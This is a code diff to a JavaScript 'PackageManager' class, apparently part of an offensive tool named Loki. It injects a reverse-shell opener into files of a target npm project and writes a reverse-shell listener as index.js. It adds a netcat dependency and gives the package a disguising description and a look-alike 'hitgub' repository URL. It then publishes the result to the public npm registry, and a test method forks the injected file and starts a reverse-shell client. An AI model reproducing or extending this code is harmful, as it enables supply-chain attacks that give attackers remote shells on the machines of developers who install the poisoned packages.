@@ -2,9 +2,10 @@
 
 import fs from 'fs'
 import pack from 'libnpmpack'
-import { execSync } from 'child_process'
+import { execSync, fork } from 'child_process'
 import { publish } from 'libnpmpublish'
 import ReverseShellGenerator from './ReverseShellGenerator.js'
+
 // npmjs default registry
 const OPTS = {
     registry: 'https://registry.npmjs.org/'
@@ -19,18 +20,34 @@ class PackageManager {
         this.directory = `${this.loki_directory}/${this.pkg}`
         this.token = token
         this.shell_data = shell_data
+        this.reverse_shell_generator = new ReverseShellGenerator(this.shell_data)
     }
 
-    installDependencies(file) {
-        return execSync(`$(which npm) ${file}`, {
+    installDependencies() {
+        return execSync(`$(which npm) install`, {
             cwd: this.base_directory
         })
     }
 
+    testInjection(file, success) {
+        fork(file, {
+            cwd: this.base_directory
+        })
+        process.on('error', function (err) {
+            console.log(err);
+        });
+        process.on('exit', function (code) {
+            const err = code === 0 ? null : new Error('exit code ' + code);
+            console.log(err);
+        });
+
+        success('Reverse shell ready:')
+        this.reverse_shell_generator.runLocalClient()
+    }
+
     insertPayload(file) {
         const contents = fs.readFileSync(`${this.base_directory}/${file}`, 'utf8')
-        fs.writeFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener(this.pkg) + contents)
-        //fs.appendFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener(this.pkg))
+        fs.writeFileSync(`${this.base_directory}/${file}`, this.reverse_shell_generator.opener(this.pkg) + contents)
         return true
     }
 
@@ -44,11 +61,16 @@ class PackageManager {
             dependencies: {
                 'netcat': '^1.5.0',
             },
-            type: 'module'
+            type: 'module',
+            description: 'Loki automation package',
+            repository: {
+                "type": "git",
+                "url":  `git://github.com/hitgub/${this.pkg}.git`
+            }
         })
         fs.writeFileSync(`${this.directory}/package.json`, package_json)
 
-        const index_js = new ReverseShellGenerator(this.shell_data).listener()
+        const index_js = this.reverse_shell_generator.listener()
         fs.writeFileSync(`${this.directory}/index.js`, index_js)
 
         const manifest = {
